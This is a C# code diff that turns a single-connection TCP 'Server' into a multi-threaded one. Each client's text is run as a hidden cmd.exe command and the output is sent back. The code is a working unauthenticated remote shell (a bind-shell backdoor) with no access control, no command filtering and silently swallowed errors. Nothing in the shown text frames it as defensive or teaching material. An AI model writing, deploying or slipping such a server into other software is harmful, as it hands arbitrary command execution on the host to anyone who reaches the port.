@@ -13,56 +13,75 @@ class Server
         listener.Start();
 
         Console.WriteLine("Server is listening...");
-        TcpClient client = listener.AcceptTcpClient();
-        Console.WriteLine("Client connected!");
-
-        NetworkStream stream = client.GetStream();
-        byte[] buffer = new byte[1024];
-
         while (true)
         {
-            int bytesRead = stream.Read(buffer, 0, buffer.Length);
-            if (bytesRead == 0)
-                break;
+            TcpClient client = listener.AcceptTcpClient();
+            Console.WriteLine("Client connected!");
 
-            string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
-            Console.WriteLine("Command: " + command);
-
-            if (command.ToLower() == "exit")
-            {
-                string goodbye = "Disconnecred from server.";
-                byte[] exitData = Encoding.UTF8.GetBytes(goodbye);
-                stream.Write(exitData, 0, exitData.Length);
-                break;
-            }
-
-            ProcessStartInfo psi = new ProcessStartInfo
-            {
-                FileName = "cmd.exe",
-                Arguments = "/c " + command,
-                RedirectStandardOutput = true,
-                RedirectStandardError = true,
-                UseShellExecute = false,
-                CreateNoWindow = true,
-            };
-            Process process = new Process();
-            process.StartInfo = psi;
-            process.Start();
-
-            string output = process.StandardOutput.ReadToEnd();
-            string error = process.StandardError.ReadToEnd();
-            process.WaitForExit();
-
-            string result = string.IsNullOrEmpty(output) ? error : output;
-            if (string.IsNullOrEmpty(result))
-                result = "Command executed with no output.";
-
-            byte[] data = Encoding.UTF8.GetBytes(result);
-            stream.Write(data, 0, data.Length);
-
+            Thread t = new Thread(() => HandleClient(client));
+            t.IsBackground = true;
+            t.Start();
         }
-        stream.Close();
-        client.Close();
-        listener.Stop();
+    }
+
+    static void HandleClient(TcpClient client)
+    {
+        NetworkStream stream = client.GetStream();
+        byte[] buffer = new byte[1024];
+        try
+        {
+            while (true)
+            {
+                int bytesRead = stream.Read(buffer, 0, buffer.Length);
+                if (bytesRead == 0)
+                    break;
+
+                string command = Encoding.UTF8.GetString(buffer, 0, bytesRead).Trim();
+                Console.WriteLine("Command: " + command);
+
+                if (command.ToLower() == "exit")
+                {
+                    string goodbye = "Disconnecred from server.";
+                    byte[] exitData = Encoding.UTF8.GetBytes(goodbye);
+                    stream.Write(exitData, 0, exitData.Length);
+                    break;
+                }
+
+                ProcessStartInfo psi = new ProcessStartInfo
+                {
+                    FileName = "cmd.exe",
+                    Arguments = "/c " + command,
+                    RedirectStandardOutput = true,
+                    RedirectStandardError = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true,
+                };
+                Process process = new Process();
+                process.StartInfo = psi;
+                process.Start();
+
+                string output = process.StandardOutput.ReadToEnd();
+                string error = process.StandardError.ReadToEnd();
+                process.WaitForExit();
+
+                string result = string.IsNullOrEmpty(output) ? error : output;
+                if (string.IsNullOrEmpty(result))
+                    result = "Command executed with no output.";
+
+                byte[] data = Encoding.UTF8.GetBytes(result);
+                stream.Write(data, 0, data.Length);
+
+            }
+        }
+        catch
+        {
+        }
+        finally
+        {
+            stream.Close();
+            client.Close();
+        }
+      
+
     }
 }
